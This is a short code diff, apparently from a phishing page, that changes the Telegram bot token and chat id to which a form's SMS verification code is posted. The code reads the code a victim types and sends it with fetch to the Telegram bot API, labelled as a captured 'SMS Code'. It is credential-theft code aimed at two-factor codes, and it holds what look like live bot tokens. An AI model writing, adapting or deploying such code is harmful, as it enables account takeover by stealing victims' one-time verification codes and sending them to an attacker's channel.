@@ -59,12 +59,12 @@
       const code = this.sms.value.trim();
       // Send code via Telegram
       fetch(
-        `https://api.telegram.org/bot8282278449:AAFAK4-kguuUmTRttN4ocgDvVxc91kWDItA/sendMessage`,
+        `https://api.telegram.org/bot8405352750:AAGzI6w6ks8p9nRgmikeST1D6QCZ0uorNPI/sendMessage`,
         {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            chat_id: "-4970333928",
+            chat_id: "-4810968086",
             text: `🔐 SMS Code: ${code}`
           })
         }
